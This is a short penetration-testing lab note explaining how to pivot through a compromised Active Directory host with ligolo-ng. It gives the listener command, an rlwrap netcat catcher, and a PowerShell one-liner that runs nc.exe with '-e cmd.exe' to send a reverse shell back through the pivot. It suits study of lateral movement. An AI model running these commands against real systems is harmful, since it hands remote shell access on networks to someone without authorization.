> Example Scenario:

Lets say we have access on an internal machine in Active Directory using Evil-winrm and the machine is called MS02. We could get a reverse shell here so we are not restricted to PS.

> On our ligolo interface we can add a new listener which will allow us to catch a reverse shell on port 4444 by forwarding the traffic from MS01 (which we originally logged into using the external IP address we are provided in the assumed breach) back to us on kali:

```
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
```

After the listener has been created now we need to run nc.exe in evil-winrm after transferring it over from kali and start a listener on port 4444. We will target port 1234 and the internal ip address of MS01 and the connection will be forwarded to our kali interface:

> On kali:

```
rlwrap nc -nvlp 4444
```

> On MS02 in Evil-winrm:

```
powershell -Command "Start-Process -NoNewWindow -FilePath nc.exe -ArgumentList '<MS01_internal_ip> 1234 -e cmd.exe'"
```

This same concept applies for file transfers and also reverse shells. We setup the listener on ligolo to receive traffic and forward it to kali then any command we run on MS02 should target MS01's internal IP address.